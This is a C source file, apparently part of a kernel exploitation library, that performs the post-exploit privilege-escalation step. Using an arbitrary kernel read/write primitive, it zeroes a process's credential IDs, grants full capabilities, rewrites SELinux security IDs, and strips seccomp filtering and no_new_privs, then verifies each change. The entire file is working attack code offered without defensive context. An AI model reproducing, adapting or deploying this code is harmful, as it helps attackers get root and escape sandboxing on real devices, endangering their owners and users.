/* lib/root/cred.c -- see cred.h. */
#include "cred.h"

int lib_patch_cred_identity(const struct krw *rw, kdirect_t cred) {
  if (!kd_is_direct(cred)) {
    return 0;
  }

  uint64_t zero_ids[4] = {0};
  if (!krw_write(rw, kd_add(cred, CRED_UID_OFF), zero_ids, sizeof(zero_ids))) {
    return 0;
  }

  uint32_t securebits = 0;
  if (!krw_write(rw, kd_add(cred, CRED_SECUREBITS_OFF), &securebits,
                 sizeof(securebits))) {
    return 0;
  }

  uint64_t caps[CRED_CAP_WORDS] = {
    CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL,
  };
  if (!krw_write(rw, kd_add(cred, CRED_CAPS_OFF), caps, sizeof(caps))) {
    return 0;
  }

  uint64_t caps_after[CRED_CAP_WORDS] = {0};
  if (!krw_read(
      rw, kd_add(cred, CRED_CAPS_OFF), caps_after, sizeof(caps_after))) {
    return 0;
  }
  for (size_t i = 0; i < CRED_CAP_WORDS; i++) {
    if (caps_after[i] != CAP_FULL) {
      return 0;
    }
  }

  return 1;
}

int lib_patch_cred_sid(
    const struct krw *rw, kdirect_t cred, uint32_t osid, uint32_t sid,
    uint32_t blob_off) {
  kdirect_t security =
    k_direct_raw(krw_read64(rw, kd_add(cred, CRED_SECURITY_OFF)));
  if (!kd_is_direct(security)) {
    return 0;
  }

  uint32_t sid_pair[2] = { osid, sid };
  kdirect_t osid_addr = kd_add(
      security, (int64_t)blob_off + SELINUX_CRED_OSID_OFF);
  return krw_write(rw, osid_addr, sid_pair, sizeof(sid_pair));
}

int lib_patch_cred_object(
    const struct krw *rw, kdirect_t cred, uint32_t osid, uint32_t sid,
    uint32_t blob_off) {
  return lib_patch_cred_identity(rw, cred) &&
         lib_patch_cred_sid(rw, cred, osid, sid, blob_off);
}

int lib_patch_task_seccomp(const struct krw *rw, kdirect_t task) {
  if (!kd_is_direct(task)) {
    return 0;
  }

  kdirect_t flags_addr = kd_add(task, TASK_THREAD_INFO_FLAGS_OFF);
  kdirect_t atomic_flags_addr = kd_add(task, TASK_ATOMIC_FLAGS_OFF);
  kdirect_t seccomp_addr = kd_add(task, TASK_SECCOMP_OFF);

  uint64_t flags_before = krw_read64(rw, flags_addr);
  uint64_t atomic_before = krw_read64(rw, atomic_flags_addr);

  uint64_t flags_want = flags_before & ~(1ULL << TIF_SECCOMP_BIT);
  uint64_t atomic_want = atomic_before & ~(1ULL << PFA_NO_NEW_PRIVS_BIT);
  uint32_t zero32 = 0;
  uint64_t zero64 = 0;

  int ok = 1;
  if (flags_want != flags_before) {
    ok &= krw_write64(rw, flags_addr, flags_want);
  }
  if (atomic_want != atomic_before) {
    ok &= krw_write64(rw, atomic_flags_addr, atomic_want);
  }
  ok &= krw_write(
    rw, kd_add(seccomp_addr, SECCOMP_MODE_OFF), &zero32, sizeof(zero32));
  ok &= krw_write(
    rw, kd_add(seccomp_addr, SECCOMP_FILTER_COUNT_OFF), &zero32,
    sizeof(zero32));
  ok &= krw_write(
    rw, kd_add(seccomp_addr, SECCOMP_FILTER_OFF), &zero64, sizeof(zero64));

  uint64_t flags_after = krw_read64(rw, flags_addr);
  uint64_t atomic_after = krw_read64(rw, atomic_flags_addr);
  uint32_t mode_after = krw_read32(rw, kd_add(seccomp_addr, SECCOMP_MODE_OFF));
  uint32_t count_after =
    krw_read32(rw, kd_add(seccomp_addr, SECCOMP_FILTER_COUNT_OFF));
  uint64_t filter_after =
    krw_read64(rw, kd_add(seccomp_addr, SECCOMP_FILTER_OFF));

  int tif_clear = (flags_after & (1ULL << TIF_SECCOMP_BIT)) == 0;
  int nnp_clear = (atomic_after & (1ULL << PFA_NO_NEW_PRIVS_BIT)) == 0;
  return ok && tif_clear && nnp_clear && mode_after == 0 &&
         count_after == 0 && filter_after == 0;
}
